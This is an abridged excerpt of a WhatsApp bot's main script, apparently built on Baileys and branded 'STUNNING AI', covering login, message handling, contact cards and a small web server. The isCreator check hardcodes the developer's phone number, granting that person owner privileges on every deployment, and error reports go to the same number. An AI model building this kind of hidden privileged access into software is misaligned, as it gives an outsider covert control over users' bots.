...
try {
    ...
    console.log("🌍 Connected to the khadher.inc DB")
} catch {
...
setTimeout(() => {
    ...
    async function syncdb() {
        ...
        const ChangePic = __dirname + "/assets/khadherinc.png"
        await writeFile(ChangePic, thumbbuffer);
        global.log0 = fs.readFileSync(__dirname + "/assets/khadherinc.png"); //ur logo pic
        const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
        const Void = VoidConnect({
            logger: pino({ level: 'fatal' }),
            printQRInTerminal: true,
            browser: ['STUNNING AI', 'safari', '1.0.0'],
    ...
    store.writeToFile(__dirname+"/store.json");
        ...
        Void.ev.on('messages.upsert', async chatUpdate => {
            ...
            try {
                ...
                var { body } = citel
		        const khadheri = ['917560920774','917560920774'] ;
                let isCreator = [ hgg,...khadheri,...global.sudo.split(','),...global.devs, ...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                var kahdheri = [...khadheri].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender)
                ...
                if (icmd) {
                    ...
                    if (cmd) {
                        isCreator = [hgg,...khadheri,...global.sudo.split(','),...global.devs,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
...
*/ //------------------------------------------------------------------------------------
                    ...
                    if (checkinfo) {
                        ...
                        try{ if (anu.id === '120363025246125888@g.us' && !khadheri ) return }
                        catch(e){console.log(`khadher.inc : ${khadheri} \nGroup Id : ${anu.id}\nerror Returning in STUNNING AI Group : ` , e)}
       ...
       Void.lastStatus = async() => {
        ...
        Void.ev.on('contacts.update', async update => {
                for (let contact of update) {
                    ...
                    kahdherinc.findOne({ id: id }).then((usr) => {
                        try{
        ...
        Void.sendContact = async(jid, kon, quoted = '', opts = {}) => {
                ...
                for (let i of kon) {
                    list.push({
                        ...
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Void.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/STUNNING-AI\nitem3.X-ABLabel:GitHub\nitem4.khadherinc:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
                    })
                }
...
else  
{
	...
	fs.unlink(trueFileName, (err) => {
      	if (err) { console.error('Error deleting file:', err); } else { console.log('File deleted successfully'); } });
	return Void.sendMessage("917560920774@s.whatsapp.net" ,{text:"There's An Error To Forward This File"},{ quoted : quote } )
}		
...
<html>
  ...
  <body>
    <section>
      Hello from "khadher.inc"!
    </section>
  </body>
</html>
`
app.get("/", (req, res) => res.type('html').send(html));
app.listen(port, () => console.log(`khadher.inc Server listening on port http://localhost:${port}!`));
